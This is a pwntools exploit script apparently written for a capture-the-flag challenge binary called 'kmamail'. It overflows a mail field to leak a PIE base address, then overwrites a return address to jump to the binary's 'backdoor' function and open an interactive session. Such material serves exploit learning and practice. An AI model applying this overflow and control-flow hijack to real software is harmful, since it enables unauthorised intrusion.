#!/usr/bin/python3

from pwn import *

exe = ELF("./kmamail")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

rs   = lambda data: r.send(data)
rsa  = lambda msg, data: r.sendafter(msg, data)
rsl  = lambda data: r.sendline(data)
rsla = lambda msg, data: r.sendlineafter(msg, data)
rsn  = lambda num: r.send(str(num).encode())
rsna = lambda msg, num: r.sendafter(msg, str(num).encode())
rsln = lambda num: r.sendline(str(num).encode())
rslna = lambda msg, num: r.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        # gdb.attach(p, gdbscript='''
        # b*send_mail+409 

        # c
        # ''')
        # sleep(1)
        gdb.attach(r, gdbscript='''
        b*send_mail+409 
        b*read_mail + 614

        

        c
        ''')

if args.REMOTE:
    p = remote('')
    r = remote('')
else:
    p = process([exe.path])
    r = process([exe.path])

GDB()

# REGISTER
slna(">",1)
sla("Username: ",b'1')
sla("Password: ",b'1')

slna(">",1)
sla("Username: ",b'2')
sla("Password: ",b'2')

slna(">",1)
sla("Username: ",b'2')
sla("Password: ",b'2')

# LOGIN

slna(">",2)
sla("Username: ",b'1')
sla("Password: ",b'1')

rslna(">",2)
rsla("Username: ",b'1')
rsla("Password: ",b'1')

rslna(">",1)
rsla("RECEIVER",b'2')

payload = b'\n'
payload += b'a' * 0x52
payload += b'\n'*3
rsl(payload)

rslna(">",0)
rslna(">",2)
rsla("Username: ",b'2')
rsla("Password: ",b'2')
rslna(">",2)

payload = b'a' * 0x52
payload += b'\n'*3
r.recvuntil(payload)
leak_pie = u64(r.recv(6)+b'\0\0')
info(hex(leak_pie))
exe.address = leak_pie - 0x1823
info(hex(exe.address))

slna(">",1)
sla("RECEIVER",b'2')

payload = b'b\n'
payload += b'\n'*3
s(payload)
sleep(2)

slna(">",1)
sla("RECEIVER",b'2')
payload = b'\n'
payload += b'c'*0x2c
payload += p8(0x57)
payload += p64(exe.sym['backdoor']+5)
payload += b'\n'*3
# max is 0x3fc byte
s(payload)
sleep(0.5)
rslna(">",2)

p.interactive()
r.interactive()


#send -> sleep -> check_read ->sleep -> write into file 


